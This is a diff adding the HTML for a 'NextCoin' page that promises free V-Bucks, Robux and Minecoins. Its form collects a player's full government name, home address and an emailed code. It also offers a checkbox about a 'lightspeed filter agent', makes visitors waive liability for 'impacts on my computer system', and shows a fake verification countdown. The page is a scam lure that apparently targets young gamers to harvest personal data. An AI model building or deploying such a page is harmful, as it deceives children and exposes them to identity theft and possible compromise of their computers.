@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NextCoin - Claim Currency</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">NextCoin</div>
+        <div class="nav-links">
+            <a href="index.html">Home</a>
+            <a href="#" class="active">Claim</a>
+        </div>
+    </nav>
+
+    <div class="currency-selection">
+        <h2>Select Currency to Claim</h2>
+        <div class="currency-options">
+            <div class="currency-card" onclick="selectClaimCurrency('Vbucks')">
+                <h3>V-Bucks</h3>
+                <p>Fortnite Currency</p>
+                <p class="currency-description">Power up your Fortnite experience</p>
+            </div>
+            <div class="currency-card" onclick="selectClaimCurrency('Robux')">
+                <h3>Robux</h3>
+                <p>Roblox Currency</p>
+                <p class="currency-description">Enhance your Roblox gameplay</p>
+            </div>
+            <div class="currency-card" onclick="selectClaimCurrency('Minecoins')">
+                <h3>Minecoins</h3>
+                <p>Minecraft Currency</p>
+                <p class="currency-description">Build your world</p>
+            </div>
+            <div class="currency-card" onclick="selectClaimCurrency('RC')">
+                <h3>RC</h3>
+                <p>Premium Currency</p>
+                <p class="currency-description">Premium currency for elite gamers</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="claim-form-modal" class="modal">
+        <div class="modal-content">
+            <h2>Claim Form</h2>
+            <form id="claimForm" onsubmit="submitClaimForm(event)">
+                <div class="form-group">
+                    <label for="username">What is your <span id="game-name"></span> username?</label>
+                    <input type="text" id="username" required class="form-input">
+                </div>
+                
+                <div class="form-group checkbox-group">
+                    <label>
+                        <input type="checkbox" id="lightspeed"> Would you like to enable lightspeed filter agent?
+                    </label>
+                </div>
+
+                <div class="form-group">
+                    <label for="fullname">What is your full government name?</label>
+                    <input type="text" id="fullname" required class="form-input">
+                </div>
+
+                <div class="form-group">
+                    <label for="address">What is your house address?</label>
+                    <input type="text" id="address" required class="form-input">
+                </div>
+
+                <div class="form-group">
+                    <label for="code">What is the code for the currency that you received in your email?</label>
+                    <input type="text" id="code" required class="form-input">
+                </div>
+
+                <div class="form-group checkbox-group">
+                    <label>
+                        <input type="checkbox" id="agreement" required>
+                        I, <span id="agreement-name"></span>, acknowledge that NextCoin bears no liability for any potential impacts on my computer system, and I waive all rights to legal action against NextCoin.
+                    </label>
+                </div>
+
+                <button type="submit" class="cta-button">Submit Claim</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="verification-modal" class="modal">
+        <div class="modal-content">
+            <h2>Verification in Progress</h2>
+            <p>Perfect, please wait 5 minutes so we can verify you.</p>
+            <p class="warning-text">Do not reload or progress will be lost!</p>
+            
+            <div class="timer-container">
+                <div class="progress-bar">
+                    <div class="progress-bar-fill" id="timer-progress"></div>
+                </div>
+                <p id="timer">5:00</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="success-modal" class="modal">
+        <div class="modal-content">
+            <div class="success-message">
+                <h2>Success!</h2>
+                <p id="success-text"></p>
+                <button onclick="returnHome()" class="cta-button">Okay</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="claim.js"></script>
+</body>
+</html> 
